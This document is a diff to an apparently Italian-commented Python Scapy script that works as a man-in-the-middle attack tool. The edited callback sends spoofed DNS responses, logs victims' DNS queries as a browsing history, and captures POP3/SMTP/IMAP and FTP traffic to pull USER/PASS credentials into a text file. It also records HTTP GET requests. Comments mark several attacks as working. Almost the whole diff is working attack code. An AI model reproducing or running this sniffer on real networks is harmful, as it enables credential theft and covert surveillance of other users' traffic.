@@ -260,9 +260,6 @@ def build_packet (packet):
 
 	return fake_pkt
 			
-	
-
-
 #funzione di callback applicata a tutti i pacchetti sniffati da Scapy
 def sniff_callback(packet):
 
@@ -282,23 +279,25 @@ def sniff_callback(packet):
 			send(fake_pkt)
 			print 'fake response sent!'
 
-    #analisi dei pacchetti DNS per creare la cronologia (attacco 2)
+    #analisi dei pacchetti DNS per creare la cronologia (attacco 2)[FUNZIONA CORRETTAMENTE]
     if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2:
 
 	dns_port = 53
-	if packet[UDP].dport == dns_port and "www." in packet[DNS].qd.qname:
+	print 'Read here the complete history...'
+	if packet[UDP].dport == dns_port:
 		website_read_url = packet[DNS].qd.qname
 		time = str(datetime.datetime.now().time())
-		msg_history = time+" | "+website_read_url
+		msg_history = 'time:'+time+' | '+website_read_url+'\n'
 		print msg_history
 		write_info(msg_history)
 	  
     ##controllo se e' traffico TCP
     #analisi del traffico mail per rubare le credenziali (attacco 3)             				     
-    if packet.haslayer(TCP):                         
+    if packet.haslayer(TCP) and attack_sel > 2:                         
         mail_ports = [110, 25, 143] 
 	#controllo se le porte sono quelle delle mail                
         if packet[TCP].dport in mail_ports or packet[TCP].sport in mail_ports and attack_sel == 3: 
+	    print 'attack 3'
             if packet[TCP].payload:
                 print str(packet[TCP].payload)
                 mail_packet = str(packet[TCP].payload)
@@ -310,8 +309,10 @@ def sniff_callback(packet):
 	
 	#analisi del traffico FTP per rubare eventuali credenziali (attacco 4)
 	ftp_port = 21   
-	#controllo se si tratta della porta ftp                              
-        if packet[TCP].dport == ftp_port or packet[TCP].sport == ftp_port and attack_sel == 4:   
+	#controllo se si tratta della porta ftp
+	#testato su www.ftptest.net                              
+        if packet[TCP].dport == ftp_port or packet[TCP].sport == ftp_port and attack_sel == 4:
+	    print 'attack 4'   
             if packet[TCP].payload:
                 ftp_packet = str(packet[TCP].payload)
                 if "USER" in ftp_packet or "PASS" in ftp_packet:
@@ -320,10 +321,11 @@ def sniff_callback(packet):
 		    #scrivo i dati sensibili sul .txt
                     write_info(ftp_packet)            
         
-	#analisi del traffico HTTP, lettura richieste HTTP (attacco 5)
+	#analisi del traffico HTTP, lettura richieste HTTP (attacco 5) [FUNZIONA CORRETTAMENTE]
 	http_port = 80                         
 	#controllo se si tratta di traffico http
-        if packet[TCP].dport == http_port or packet[TCP].sport == http_port and attack_sel == 5 :  		
+        if packet[TCP].dport == http_port or packet[TCP].sport == http_port and attack_sel == 5 :  
+	    print 'attack 5'		
             if packet[TCP].payload:
                 http_packet = str(packet[TCP].payload)
                 if "GET" in http_packet:
